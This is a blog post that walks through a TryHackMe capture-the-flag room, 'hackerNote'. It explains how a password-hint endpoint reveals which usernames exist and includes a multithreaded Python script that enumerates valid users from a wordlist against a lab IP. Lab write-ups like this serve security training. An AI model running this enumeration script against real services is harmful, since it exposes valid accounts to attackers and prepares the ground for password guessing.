---
layout: post
title: "Script sketch for a hackerNote room"
date: 2025-03-17 00:00:00 +0100
categories: [thm, hacking, linux]
tags: [ctf, python, script]
---

![sketch](/pics/scripthint.png)

### Basic info
There is a medium room [hackerNote](https://tryhackme.com/room/hackernote) on TryHackMe (from my point of view it could be even considered as easy one because of a pretty comprehensive walkthrough)

### Exploit a username
Script provided in the room is ok, but I decide to write mine because why not :D
If you check in burp or inspect in the browser - you could notice - every attempt to get a password hint an actual get request to this endpoint:

```bash
http://<ip>:80/api/user/passwordhint/<username>
```

If username exists - you will get a `200` with a hint, so lets use this approach + some multithreading by creating a bomb.py file with this script:

```python
import requests
import sys
from concurrent.futures import ThreadPoolExecutor


def get_password_hint(name):
    url = "http://10.10.254.38/api/user/passwordhint/"
    response = requests.get(url + name)

    # Check the response and print the name if successful
    if response.status_code == 200:
        print(name)

# Get the filepath from the command line argument
filepath = sys.argv[1]

# Read the names from the file
with open(filepath, "r") as file:
    names = [line.strip() for line in file]

# Use to handle requests concurrently
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(get_password_hint, names)
```

- Sure it could be improved - we could print a hint near the username, or add ability to provide ip ... anyway for one time use it would enough to keep it this simlpe.

Usage:

```bash
python3 bomb.py /path/to/your/username/file
```

### Conclusion
Using this kind of script is better (in this case) from my point of view because you don't need to count a request time or do any extra logic besides a regular get request + also here we have a multithreading to handle requests faster than regular for loop.

So KISS - keep it simple stupid :)